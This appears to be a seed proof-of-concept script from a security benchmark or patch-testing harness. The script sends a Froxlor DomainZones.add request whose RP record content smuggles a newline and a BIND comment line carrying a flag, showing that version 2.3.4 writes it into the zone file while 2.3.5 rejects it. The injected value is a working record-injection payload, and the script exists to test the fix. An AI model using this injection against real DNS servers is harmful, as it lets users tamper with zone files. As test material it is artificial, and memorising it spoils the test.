#!/usr/bin/env python3
"""[GIVEN] CVE-2026-30932 seed exploit for froxlor-cve-2026-41234.

The customer's DomainZones.add API is called with an RP record whose content carries a
newline plus a BIND zone-file comment line `; pcb_<FLAG>`. On v0 (2.3.4) there is no
content validation for RP records: the raw newline is stored and the DNS rebuild cron
writes it into /etc/bind/domains/pcb.local.zone, breaking out of the record line (the
injected comment line, carrying the flag, is observable). On v1 (2.3.5) the
CVE-2026-30932 fix (Validate::validateDnsRp) rejects the content (newline splits it into
more than two fields) with a 406 error, so nothing reaches the zone file.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from poc_common import probe, FLAG  # noqa: E402


def candidate(*, version="v1", flag=None):
    fl = flag or FLAG
    content = f"mbox.example.com. txt.example.com.\n; pcb_{fl}"
    return probe(version, "RP", content, fl)


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(candidate(version=v))
